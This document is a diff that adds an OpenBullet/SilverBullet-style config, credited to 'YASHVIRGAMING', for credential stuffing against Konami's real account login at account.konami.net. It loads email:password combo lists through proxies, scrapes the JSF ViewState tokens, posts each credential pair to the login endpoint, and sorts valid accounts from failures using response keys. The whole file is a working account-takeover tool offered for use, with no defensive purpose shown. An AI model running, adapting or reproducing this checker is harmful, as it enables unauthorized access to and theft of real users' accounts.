@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "Konami",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-23T09:33:52.5281657+00:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Konami BY @ixx10",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://account.konami.net/connect/?client_id=u745dx9nckm4janoi5zp9x93twa7mgtu&redirect_uri=pesactionmobile%3A%2F%2Fkonaminet.jp%2Fkonamiid&entry=0#" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#T PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"footer-form\" value=\"footer-form\" />" "autocomplete=\"off\" />" -> VAR "T" 
+
+#T2 PARSE "<adt>" LR "value=\"" "\"" EncodeOutput=TRUE -> VAR "T2" 
+
+#Post REQUEST POST "https://account.konami.net/connect/index.html" 
+  CONTENT "topForm=topForm&javax.faces.ViewState=<T2>&topForm%3Aj_idt52=topForm%3Aj_idt52" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#T3 PARSE "<SOURCE>" LR "id=\"j_id1:javax.faces.ViewState:0\" value=\"" "\"" EncodeOutput=TRUE -> VAR "T3" 
+
+#User FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#Pass FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#Post_2 REQUEST POST "https://account.konami.net/connect/login.html" AutoRedirect=FALSE 
+  CONTENT "loginForm=loginForm&loginForm%3AuserId=<US>&loginForm%3Apassword=<PS>&loginForm%3Aotp=&loginForm%3Aj_idt51=&javax.faces.ViewState=<T3>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: account.konami.net" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"95\", \"Chromium\";v=\"95\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Origin: https://account.konami.net" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://account.konami.net/connect/index.html" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 197" 
+
+#check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS>" Contains "iid?code=" 
+  KEYCHAIN Failure OR 
+    KEY "cter. Vérifiez votre ID de connexion" 
+    KEY "Your Password must be a combination of alphanumeric characters of 8-32 characters in length" 
+    KEY "Unable to login. Check your Login ID and password again." 
+
+#By FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By" 
+
